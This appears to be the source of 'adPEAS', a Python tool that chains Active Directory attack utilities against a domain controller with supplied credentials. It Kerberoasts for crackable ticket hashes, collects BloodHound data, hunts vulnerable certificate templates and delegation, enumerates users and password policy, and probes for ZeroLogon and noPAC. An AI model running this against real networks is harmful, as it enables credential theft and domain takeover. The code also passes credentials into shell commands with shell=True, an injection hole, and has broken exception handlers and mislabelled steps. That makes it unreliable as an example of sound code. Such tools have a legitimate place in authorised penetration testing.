import argparse
import getpass
import subprocess
from ldap3 import Server, Connection, SUBTREE
import sys


if sys.version_info >= (3, 8):
    from importlib import metadata
else:
    import importlib_metadata as metadata

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

def certipy(username, password, domain, dc_ip):
     try:
          cmd = f"certipy find -u {username}@{domain} -p {password} -dc-ip {dc_ip} -enabled -vulnerable"
          subprocess.run(cmd, shell=True)
         # parse_certipy_output(output)
     except Exception as e:
        print(f"Error while running Certipy: {e}")

def findDelegation(username, password, domain, dc_ip):
     try:
          cmd = f"findDelegation.py -dc-ip {dc_ip} {domain}/{username}:{password}"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while finding delegation: {e}")

def bloodhound(username, password, domain, dc_ip):
     try:
          cmd = f"bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip} -c All"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error running BloodHound: {e}")

def certi(username, password, domain, dc_ip):
     try:
          cmd = f"certi.py list '{domain}/{username}':'{password}' --dc-ip {dc_ip} --vuln --enable"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error running Certi.py: {e}")

def ldapSigning(username, password, domain, dc_ip):
     try:
          cmd = f"nxc ldap {dc_ip} -u '{username}' -p '{password}' -M ldap-checker"
          subprocess.run(cmd, shell=True)
     except exception as e:
          print(f"Error while checking for LDAP Signing: {e}")

def enumUsers(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' --users"
          subprocess.run(cmd, shell=True)
     except exception as e:
          print(f"Error while enumerating users: {e}")

def enumPassPol(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' --pass-pol"
          subprocess.run(cmd, shell=True)
     except exception as e:
          print(f"Error while enumerating password policy: {e}")

def zerologon(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' -M zerologon"
          subprocess.run(cmd, shell=True)
     except exception as e:
          print(f"Error while checking for ZeroLogon: {e}")

def noPAC(username, password, domain, dc_ip):
     try:
          cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' -M nopac"
          subprocess.run(cmd, shell=True)
     except exception as e:
          print(f"Error while checking for noPAC: {e}")

def webDAV(username, password, domain, scope):
     try:
          cmd = f"nxc smb {scope} -u '{username}' -p '{password}' -M webdav"
          subprocess.run(cmd, shell=True)
     except exception as e:
          print(f"Error while checking for webDAV: {e}")

def main(arguments=None):
    adPEAS_version = metadata.version('adPEAS')
    parser = argparse.ArgumentParser("adPEAS")
    parser.add_argument('--version', action='version', version=f"v{adPEAS_version}")
    parser.add_argument("-u", "--username", required=True, help="Username for log in.")
    parser.add_argument("-p", "--password", help="Password for log in. Will prompt if not specified.")
    parser.add_argument("-d", "--domain", required=True, help="Domain of the DC.")
    parser.add_argument("-i", "--dc-ip", required=True, help="Domain Controller IP or hostname.")
    parser.add_argument("-nb", "--no-bloodhound", action="store_true", help="Run adPEAS without Bloodhound")
    parser.add_argument("-nc", "--no-certipy", action="store_true", help="Run adPEAS without Certipy")
    parser.add_argument("-s", "--scope", required=False, help="Newline delimited scope file.")

    if arguments is None:
        args = parser.parse_args()
    else:
        args = parser.parse_args(arguments)

    print(f"Welcome to adPEAS v{adPEAS_version}!")

    domain = args.domain
    dc_ip = args.dc_ip
    username = args.username
    password = args.password if args.password else getpass.getpass()
    scope = args.scope

    print("Attempting to kerberoast the domain...")
    find_and_kerberoast_objects(username, password, domain, dc_ip)
    print("Kerberoasting done!")

    if not args.no_bloodhound:
        print("Collecting information for BloodHound...")
        bloodhound(username, password, domain, dc_ip)
        print("Done collecting Bloodhound information.")

    if not args.no_certipy:
        print("Attempting to find all ADCS infrastructure...")
        certipy(username, password, domain, dc_ip)
        certi(username, password, domain, dc_ip)
        print("Done finding all ADCS infrastructure.")

    print("Attempting to find all delegation...")
    findDelegation(username, password, domain, dc_ip)
    print("Done finding all delegation.")

    print("Enumerating domain users...")
    enumUsers(username, password, domain, dc_ip)
    print("Done enumerating users.")

    print("Enumerating password policy...")
    enumPassPol(username, password, domain, dc_ip)
    print("Done enumerating password policy.")

    print("Checking LDAP signing requirements...")
    ldapSigning(username, password, domain, dc_ip)
    print("Done checking LDAP singing requirements.")

    print("Checking for ZeroLogon...")
    zerologon(username, password, domain, dc_ip)
    print("Done checking for ZeroLogon.")

    print("Checking for noPAC...")
    noPAC(username, password, domain, dc_ip)
    print("Done checking for noPAC.")

    print("Checking for noPAC...")
    webDAV(username, password, domain, scope)
    print("Done checking for noPAC.")

    print("Thank you for using adPEAS!")